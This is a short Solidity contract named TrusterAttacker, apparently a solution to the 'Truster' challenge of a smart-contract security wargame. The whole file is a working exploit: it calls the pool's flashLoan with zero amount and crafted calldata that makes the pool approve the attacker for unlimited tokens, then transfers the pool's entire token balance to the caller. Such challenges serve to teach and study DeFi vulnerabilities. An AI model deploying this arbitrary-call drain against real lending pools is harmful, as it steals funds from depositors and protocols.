// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "./TrusterLenderPool.sol";

contract TrusterAttacker {
    constructor(TrusterLenderPool pool, ERC20 token) {
        pool.flashLoan(0, address(pool), address(token),
                       abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max)
                      );
        token.transferFrom(address(pool), msg.sender, token.balanceOf(address(pool)));
    }
}
